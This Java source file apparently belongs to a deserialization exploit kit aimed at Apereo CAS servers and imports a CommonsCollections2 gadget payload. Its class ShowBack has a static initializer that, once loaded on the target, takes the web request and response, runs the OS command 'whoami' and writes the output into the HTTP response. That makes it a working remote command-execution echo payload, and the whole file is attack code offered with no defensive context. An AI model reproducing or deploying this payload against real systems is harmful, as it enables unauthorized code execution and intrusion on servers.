package maoge.cas;

import maoge.cas.payloads.CommonsCollections2;
import org.springframework.webflow.context.ExternalContext;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Serializable;

public class ShowBack implements Serializable {


    static {
        try {
            ExternalContext externalContext=  org.springframework.webflow.context.ExternalContextHolder.getExternalContext();
            Object request = externalContext.getNativeRequest();
            Object response = externalContext.getNativeResponse();
            HttpServletRequest httpServletRequest = (HttpServletRequest) request;
            HttpServletResponse httpServletResponse = (HttpServletResponse)response;
            //执行命令
            Process p = Runtime.getRuntime().exec("whoami");
            InputStream fis=p.getInputStream();
            InputStreamReader isr=new InputStreamReader(fis);
            BufferedReader br=new BufferedReader(isr);
            String line="hello--";
            ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream();
            while((line=br.readLine())!=null) {
                servletOutputStream.write(line.getBytes());
            }
            System.out.println("=========================");
            servletOutputStream.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
